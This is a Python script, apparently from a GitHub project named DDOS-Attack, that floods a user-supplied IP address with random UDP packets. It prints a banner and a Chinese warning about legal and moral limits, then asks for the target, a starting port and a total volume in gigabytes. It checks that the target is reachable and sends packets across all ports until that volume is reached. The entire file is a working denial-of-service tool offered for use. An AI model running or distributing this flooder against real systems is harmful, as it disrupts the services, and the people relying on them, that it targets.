import sys
import os
import time
import socket
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
PACKET_SIZE = 1490
data = os.urandom(PACKET_SIZE)   # 随机载荷
#############

os.system("clear")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("M       MMM M       MMM MMM     MMM MM       MM   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M  MMMMM  M   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M M        MM   BC-809")
print("M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M   BC-809")
print("M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M   BC-809")
print("M        MM M        MM MMM     MMM MM       MM   BC-809")
print("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM   BC-809")
print("严重警告")
print("你已经触碰到了法律和道德边缘，请立即退出，或等待3秒")
time.sleep(1)
print("3")
time.sleep(1)
print("2")
time.sleep(1)
print("1")
time.sleep(1)
print("Starting...")
time.sleep(2)

os.system("clear")
os.system("figlet DDOS-Attack")
print("Author    : BC-U809")
print("GitHub    : https://github.com/BC-809/DDOS-Attack.git")
print("")

ip = input("IP Target : ")
port = int(input("Port       : "))

# ---------- 输入总流量（GB）----------
gb = float(input("Total data to send (GB) : "))
total_bytes = gb * 1024 * 1024 * 1024
max_packets = int(total_bytes // PACKET_SIZE)   # 根据包大小计算总包数
print(f"[*] Will send {max_packets} packets ({gb} GB).")

# ---------- 目标可达性检查 ----------
def check_target(ip, port):
    """尝试 TCP 连接，成功返回 True，否则返回 False"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        s.close()
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

print("[*] Checking target...")
if not check_target(ip, port):
    print("DDOS-Attack------ERROR")
    sys.exit(1)
# ----------------------------------------------

sent = 0
sent_bytes = 0
next_mb_threshold = 1024 * 1024   # 1 MB

while sent < max_packets:
    try:
        sock.sendto(data, (ip, port))
        sent += 1
        sent_bytes += PACKET_SIZE
        port += 1
        if port == 65534:
            port = 1

        # 每当累计发送量达到下一个 MB 时输出一次
        if sent_bytes >= next_mb_threshold:
            mb_sent = sent_bytes / (1024 * 1024)
            print(f"Sent {sent} packets, total {mb_sent:.2f} MB")
            next_mb_threshold += 1024 * 1024

    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
        sys.exit()
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit()

print(f"\n[+] Finished. Total packets sent: {sent}, total data: {sent_bytes / (1024 * 1024):.2f} MB")
